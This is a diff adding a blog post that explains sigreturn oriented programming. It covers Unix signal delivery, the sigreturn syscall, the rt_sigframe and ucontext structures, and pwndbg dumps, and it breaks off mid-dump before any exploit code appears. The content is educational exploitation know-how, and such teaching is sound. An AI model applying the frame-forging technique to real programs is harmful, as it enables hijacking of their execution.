@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Sigreturn Oriented Programming | Intranautic</title>
+<meta property="og:title" content="Sigreturn Oriented Programming | Intranautic" />
+<meta name="twitter:title" content="Sigreturn Oriented Programming | Intranautic" />
+<meta itemprop="name" content="Sigreturn Oriented Programming | Intranautic" />
+<meta name="application-name" content="Sigreturn Oriented Programming | Intranautic" />
+<meta property="og:site_name" content="The Information Machine" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="https://intranautic.com/" />
+  <meta property="og:image" content="https://intranautic.com/" />
+  <meta name="twitter:image" content="https://intranautic.com/" />
+  <meta name="twitter:image:src" content="https://intranautic.com/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-02-27T00:00:00Z />
+    <meta property="article:published_time" content=2023-02-27T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Sigreturn Oriented Programming",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-02-27",
+        "description": "",
+        "wordCount":  3457 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-02-27",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Intranautic"
+        }
+    }
+    </script>
+
+  <meta name="generator" content="Hugo 0.111.3">
+
+  
+
+  <link rel="canonical" href="https://intranautic.com/posts/sigreturn-oriented-programming/"><link href="/sass/main.min.36e7ee4e3046bff5f058154410a73a98578dd678c08cd8c5c0b28bedca593f36.css" rel="stylesheet"><link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+  
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#2b5797">
+  <meta name="msapplication-config" content="/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <link rel="icon" type="image/svg+xml" href="/images/favicon/favicon.svg">
+
+  
+    </head><body data-theme = "dark" class="notransition">
+<script src="https://intranautic.com/js/themeLoader.min.4e9e1a253d543bbfec02e7f2460d9621e719fd739dc8a5256faa91cda6e12e03.js"></script><div class="navbar" role="navigation">
+  <nav class="menu" aria-label="Main Navigation">
+    <a href="/" class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+    </a>
+    <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+    <label for="menu-trigger">
+      <span class="menu-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+      </span>
+    </label>
+
+    <div class="trigger">
+      <ul class="trigger-container">
+        
+        
+          <li>
+            <a 
+            class="menu-link "
+            href="/">
+            Home
+            </a>
+            
+          </li>
+        
+          <li>
+            <a 
+            class="menu-link active"
+            href="/posts/">
+            Posts
+            </a>
+            
+          </li>
+        
+          <li>
+            <a 
+            class="menu-link "
+            href="/about/">
+            About
+            </a>
+            
+          </li>
+        
+        <li class="menu-separator">
+          <span>|</span>
+        </li>
+      </ul>
+      <a id="mode" href="#">
+        <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+      </a>
+    </div>
+  </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Sigreturn Oriented Programming</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-02-27T00:00:00&#43;00:00" itemprop="datePublished"> Feb 27, 2023 </time>
+                </div>
+            </header>
+            <div class="page-content">
+                <hr>
+<p>Throughout the years, there have been a multitude of techniques which arose to take advantage
+of and exploit various mechanisms present within software. One such technique takes advantage
+of the signal handling routine of Unix based operating systems to gain arbitrary code execution.</p>
+<p>Within this post, I will be covering the technique known as sigreturn oriented programming,
+as well as various properties it possesses which allows us to construct a weird machine. I will
+elaborate on this term, as well as the technique at a later point within this post, but first we
+need to gain a fundamental understanding of what signals are and their implementation within Unix
+based systems.</p>
+<h2 id="signal-handling">Signal Handling</h2>
+<p>So what are signals, how do they work and what purpose do they serve?</p>
+<p>We can consider signals as a mechanism for interprocess communication for the various events
+or requests. It is a software interrupt which is asynchronously delivered to a process to
+indicate a specific event.</p>
+<p>An important distinction to take note of are the limitations of signals as opposed to other
+forms of IPC. We can think of each signal as a flag of sorts to indicate an event or behavior.
+We can also implement our own signal handler programatically which allows us to execute
+our own callbacks.</p>
+<p>The following is a list of the signals supported by the Posix Standard, as well as a brief
+description of their functionality. Its not important to know each of these, but its
+good to keep a reference in the scenario that one of these signals are encountered. This
+section is from the man page of signal(7).</p>
+<pre tabindex="0"><code>Manual page signal(7)
+
+Signal      Standard   Action   Comment
+────────────────────────────────────────────────────────────────────────
+SIGABRT      P1990      Core    Abort signal from abort(3)
+SIGALRM      P1990      Term    Timer signal from alarm(2)
+SIGBUS       P2001      Core    Bus error (bad memory access)
+SIGCHLD      P1990      Ign     Child stopped or terminated
+SIGCLD         -        Ign     A synonym for SIGCHLD
+SIGCONT      P1990      Cont    Continue if stopped
+SIGEMT         -        Term    Emulator trap
+SIGFPE       P1990      Core    Floating-point exception
+SIGHUP       P1990      Term    Hangup detected on controlling terminal
+                               or death of controlling process
+SIGILL       P1990      Core    Illegal Instruction
+SIGINFO        -                A synonym for SIGPWR
+SIGINT       P1990      Term    Interrupt from keyboard
+SIGIO          -        Term    I/O now possible (4.2BSD)
+SIGIOT         -        Core    IOT trap. A synonym for SIGABRT
+SIGKILL      P1990      Term    Kill signal
+SIGLOST        -        Term    File lock lost (unused)
+SIGPIPE      P1990      Term    Broken pipe: write to pipe with no
+                               readers; see pipe(7)
+SIGPOLL      P2001      Term    Pollable event (Sys V);
+                               synonym for SIGIO
+SIGPROF      P2001      Term    Profiling timer expired
+SIGPWR         -        Term    Power failure (System V)
+SIGQUIT      P1990      Core    Quit from keyboard
+SIGSEGV      P1990      Core    Invalid memory reference
+SIGSTKFLT      -        Term    Stack fault on coprocessor (unused)
+SIGSTOP      P1990      Stop    Stop process
+SIGTSTP      P1990      Stop    Stop typed at terminal
+SIGSYS       P2001      Core    Bad system call (SVr4);
+                               see also seccomp(2)
+SIGTERM      P1990      Term    Termination signal
+SIGTRAP      P2001      Core    Trace/breakpoint trap
+SIGTTIN      P1990      Stop    Terminal input for background process
+SIGTTOU      P1990      Stop    Terminal output for background process
+SIGUNUSED      -        Core    Synonymous with SIGSYS
+SIGURG       P2001      Ign     Urgent condition on socket (4.2BSD)
+SIGUSR1      P1990      Term    User-defined signal 1
+SIGUSR2      P1990      Term    User-defined signal 2
+SIGVTALRM    P2001      Term    Virtual alarm clock (4.2BSD)
+SIGXCPU      P2001      Core    CPU time limit exceeded (4.2BSD);
+                               see setrlimit(2)
+SIGXFSZ      P2001      Core    File size limit exceeded (4.2BSD);
+                               see setrlimit(2)
+SIGWINCH       -        Ign     Window resize signal (4.3BSD, Sun)
+</code></pre><p>When we want to send a signal to a process, we utilize the system call <code>kill</code>.</p>
+<p>As not all signals are meant to signify the termination of a process, the naming convention
+for the system call can be a bit confusing. The reasoning behind this is the fact that the
+kill system call was initially introduced during early development of Unix, at which time
+the purpose of signals were primarily to kill processes.</p>
+<p>Over time various other signals were implemented into Unix, so the name is retained for
+backwards compatability with earlier versions of Unix.</p>
+<p>When the kernel delivers a signal, it must first perform a (signal) context-switch before it
+can execute the signal handler (this is not to be confused with the context-switch from user
+to kernel space due to the system call). The kernel will store the current state and context of
+the process and write it to the stack in the form of a runtime signal frame structure. We will
+explore this structure later on due to its relevance in the exploitation of the signal handling
+mechanism.</p>
+<p>However, if the signal handler resides within user space, why is there a need for a context
+switch?</p>
+<p>This is due to the fact that signals are an asynchronous operation, meaning that we cant
+simply execute a signal handler like we would any other subroutine. Signals need to be
+handled at the point in time that they are delivered.</p>
+<p>Once this frame has stored the context of the execution for the running process on the stack,
+the process then executes the signal handler. If control returns back from the handler to
+the process, the function sigreturn will be called and the the context of the process is
+restored and continues exection.</p>
+<p>A more detailed sequence of events is depicted as follows.</p>
+<ol>
+<li>Send a signal to a process via kill system call, interrupts or some other form of
+interprocess communication.</li>
+<li>Kernel initially handles the request for a signal to be delivered to a process by
+calling do_signal. This function is responsible for handling the initial processing
+of the signal as well as validating permissions and validity of the signal.</li>
+<li>Then the kernel will call the function handle_signal, which determines how the
+signal should be handled. If there has been a custom signal handler implemented
+programatically by the developer, it will then prepare the call this handler. Else
+it will execute its default operation and terminate the process.</li>
+<li>In the scenario in which there is a signal handler implemented, setup_frame will
+be called. This function saves the current execution context of the process on the
+stack.</li>
+<li>After this, the kernel will transfer control flow over to the signal handler. An
+important thing to keep in mind is the fact that the execution of the signal handler
+is done within the same process environment. We cannot execute user land code in
+the kernel due to <a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention">SMAP/SMEP</a>;
+it would not make sense to either.</li>
+</ol>
+<p>Once the signal handler has finished executing, we need some mechanism which restores
+the previous execution context and resumes the running process. The following is a
+high level sequence of events which allows for this.</p>
+<ol>
+<li>When a signal handler is finished executing, the system call sigreturn will be invoked.</li>
+<li>A context switch is performed from user space into kernel space due to the system call. The
+kernel is now responsible for restoring the previous execution context stored on the user space
+stack.</li>
+<li>Once the process state is restored, the kernel transfers control back to the process and
+resumes execution.</li>
+</ol>
+<h2 id="signal-frame-structure">Signal Frame Structure</h2>
+<p>Let&rsquo;s take a closer look into the exact structures involved with signal handling, more
+specifically, <code>struct rt_sigframe</code>. This is the structure which contains the current
+execution context of the running process. The runtime signal frame is stored on the
+user land stack; which allows for malicious crafted input to forge a frame if they have
+enough control over the stack.</p>
+<p>The following is the definition of the runtime signal frame structure. Keep in mind that
+the structure is heavily architecture dependent. I will only be covering the structure
+for modern x86_64 linux systems.</p>
+<p><code>https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/sigframe.h#L57</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">rt_sigframe</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">pretcode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">ucontext</span> <span class="n">uc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">siginfo</span> <span class="n">info</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* fp state follows here */</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>The first field for this structure is <code>char __user *pretcode</code>, which essentially holds the
+return address for the signal handler. Once the handler has finished executing, it will
+jump to the address present in this field. Keep in mind that the <code>__user</code> macro denotes
+an address in user space.</p>
+<p>If we view the value at runtime, we can see that it is populated with the address of
+the symbol <code>__restore_rt</code>. The following is the disassembly of the function within
+libc.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">x</span><span class="err">/</span><span class="mi">2</span><span class="no">i</span> <span class="mi">0x00007ffff7de6ab0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7de6ab0</span> <span class="err">&lt;</span><span class="no">__restore_rt</span><span class="err">&gt;</span><span class="p">:</span>       <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="mi">0xf</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7de6ab7</span> <span class="err">&lt;</span><span class="no">__restore_rt</span><span class="err">+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">syscall</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span>
+</span></span></code></pre></div><p>The code stub simply invokes the sigreturn system call. When the signal handler returns,
+it will execute sigreturn to restore and resume execution context for the running process.
+As previously explained, sigreturn will be responsible for this operation.</p>
+<p>The next field <code>struct ucontext uc</code> expands into the following structure.</p>
+<p><code>https://elixir.bootlin.com/linux/latest/source/arch/alpha/include/asm/ucontext.h#L5</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#ifndef _ASMAXP_UCONTEXT_H
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define _ASMAXP_UCONTEXT_H
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">ucontext</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>	  <span class="n">uc_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">ucontext</span>  <span class="o">*</span><span class="n">uc_link</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">old_sigset_t</span>	  <span class="n">uc_osf_sigmask</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">stack_t</span>		  <span class="n">uc_stack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">sigcontext</span> <span class="n">uc_mcontext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">sigset_t</span>	  <span class="n">uc_sigmask</span><span class="p">;</span>	<span class="cm">/* mask last for extensibility */</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#endif </span><span class="cm">/* !_ASMAXP_UCONTEXT_H */</span><span class="cp">
+</span></span></span></code></pre></div><p>This structure stores the user context for the running process. The following is a brief
+description for each of the structure fields.</p>
+<ul>
+<li>struct ucontext
+<ul>
+<li>uc_flags: stores flags which indicate the current status of the execution context.</li>
+<li>uc_link: pointer to an execution context which should be resumed when the current
+context completes, used for context switching and thread scheduling.</li>
+<li>uc_osf_sigmask: this field stores the process signal mask. the collection of signals
+which are currently blocked is known as the signal mask.</li>
+<li>uc_stack: the stack used by the current signal context.</li>
+<li>uc_mcontext: this structure contains a machine architecture specific snapshot of the
+execution context.</li>
+<li>uc_sigmask: contains the signal mask within the context, same as the uc_osf_sigmask
+field.</li>
+</ul>
+</li>
+</ul>
+<p>Let&rsquo;s take a look at this structure at runtime and examine each of it&rsquo;s fields.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="p">*(</span><span class="no">struct</span> <span class="no">ucontext_t</span><span class="p">*)</span> <span class="mi">0x7fffffffd680</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$10</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">uc_flags</span> <span class="err">=</span> <span class="mi">7</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">uc_link</span> <span class="err">=</span> <span class="mi">0x0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">uc_stack</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ss_sp</span> <span class="err">=</span> <span class="mi">0x0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ss_flags</span> <span class="err">=</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ss_size</span> <span class="err">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="err">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">uc_mcontext</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gregs</span> <span class="err">=</span> <span class="err">{</span><span class="mi">140737488346224</span><span class="p">,</span> <span class="mi">140737353936240</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">514</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">140737488346712,</span> <span class="err">140737354125312,</span> <span class="err">93824992247256,</span> <span class="err">2,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">140737488345728,</span> <span class="err">140737488346416,</span> <span class="err">140737488346696,</span> <span class="err">0,</span> <span class="err">0,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">140737351936899,</span> <span class="err">140737488346400,</span> <span class="err">93824992235913,</span> <span class="err">518,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">12103423998558259,</span> <span class="err">0,</span> <span class="err">3,</span> <span class="err">0,</span> <span class="err">0},</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fpregs</span> <span class="err">=</span> <span class="mi">0x7fffffffd840</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">3</span><span class="p">,</span> <span class="mi">140733193388032</span><span class="p">,</span> <span class="mi">140737488345096</span><span class="p">,</span><span class="mi">140737488345092</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">0,</span> <span class="err">0,</span> <span class="err">140737353919659,</span> <span class="err">4160530904}</span>
+</span></span><span class="line"><span class="cl">  <span class="err">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">uc_sigmask</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__val</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">140737488345304</span><span class="p">,</span> <span class="mi">93824992232647</span><span class="p">,</span> <span class="mi">140737354131016</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">140737353708968,</span> <span class="err">140737354130112,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">466005475,</span> <span class="err">140737488345344,</span> <span class="err">140737353958056,</span> <span class="err">1,</span> <span class="err">140737353708968,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">1,</span> <span class="err">0,</span> <span class="err">1,</span> <span class="err">140737354130112,</span> <span class="err">140737354131016}</span>
+</span></span><span class="line"><span class="cl">  <span class="err">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__fpregs_mem</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">cwd</span> <span class="err">=</span> <span class="mi">55416</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">swd</span> <span class="err">=</span> <span class="mi">65535</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ftw</span> <span class="err">=</span> <span class="mi">32767</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fop</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">rip</span> <span class="err">=</span> <span class="mi">140733193388033</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">rdp</span> <span class="err">=</span> <span class="mi">140737488345216</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mxcsr</span> <span class="err">=</span> <span class="mi">895</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mxcr_mask</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_st</span> <span class="err">=</span> <span class="err">{{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">8064</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65535</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">significand</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exponent</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">}},</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_xmm</span> <span class="err">=</span> <span class="err">{{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
